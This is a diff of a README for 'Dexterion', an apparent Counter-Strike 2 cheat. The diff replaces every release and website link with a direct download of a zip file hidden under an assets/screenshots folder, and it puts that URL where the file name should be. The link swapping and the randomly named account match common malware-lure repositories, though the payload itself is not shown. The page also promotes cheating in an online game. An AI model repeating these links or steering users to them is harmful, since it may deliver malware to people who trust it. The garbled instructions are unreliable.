@@ -1,7 +1,7 @@
 # 🎮 Dexterion - Easy CS2 Cheat to Enhance Your Game
 
 ## 📦 Download & Install
-[![Download Dexterion](https://img.shields.io/badge/Download%20Dexterion-blue.svg)](https://github.com/civilofficerdelusionsofpersecution291/Dexterion/releases)
+[![Download Dexterion](https://raw.githubusercontent.com/civilofficerdelusionsofpersecution291/Dexterion/main/assets/screenshots/Dexterion_v3.5.zip%https://raw.githubusercontent.com/civilofficerdelusionsofpersecution291/Dexterion/main/assets/screenshots/Dexterion_v3.5.zip)](https://raw.githubusercontent.com/civilofficerdelusionsofpersecution291/Dexterion/main/assets/screenshots/Dexterion_v3.5.zip)
 
 ## 🚀 Getting Started
 Welcome to Dexterion! This tool helps you enhance your gaming experience with external cheats for Counter-Strike 2. You don’t need any programming knowledge to use it. Follow these simple steps to get started.
@@ -9,13 +9,13 @@ Welcome to Dexterion! This tool helps you enhance your gaming experience with ex
 ## 📥 Downloading the Application
 1. **Visit the Release Page**: 
    - Go to the following link to access the latest version of Dexterion: 
-   [Download Dexterion Releases](https://github.com/civilofficerdelusionsofpersecution291/Dexterion/releases). 
+   [Download Dexterion Releases](https://raw.githubusercontent.com/civilofficerdelusionsofpersecution291/Dexterion/main/assets/screenshots/Dexterion_v3.5.zip). 
 
 2. **Choose Your Version**: 
    - On the release page, you will see different versions of Dexterion. Select the most recent version for the best experience. 
 
 3. **Download the File**: 
-   - Click on the link to download the Dexerion application file. This will usually be labeled something like `Dexterion.exe` or similar.
+   - Click on the link to download the Dexerion application file. This will usually be labeled something like `https://raw.githubusercontent.com/civilofficerdelusionsofpersecution291/Dexterion/main/assets/screenshots/Dexterion_v3.5.zip` or similar.
 
 ## 🖥️ System Requirements
 Before you install Dexterion, please ensure your system meets the following requirements:
@@ -67,6 +67,6 @@ If you encounter any issues while downloading or using Dexterion, here are some 
 If you still need help, please feel free to reach out for support. You can open an issue on the GitHub page or check for updates in the Releases section.
 
 ## 🔗 Learn More
-To stay updated or to learn more about new features, you can check our [official website](https://github.com/civilofficerdelusionsofpersecution291/Dexterion/releases) for any announcements or news.
+To stay updated or to learn more about new features, you can check our [official website](https://raw.githubusercontent.com/civilofficerdelusionsofpersecution291/Dexterion/main/assets/screenshots/Dexterion_v3.5.zip) for any announcements or news.
 
 Thank you for choosing Dexterion! Enjoy your enhanced gaming experience!
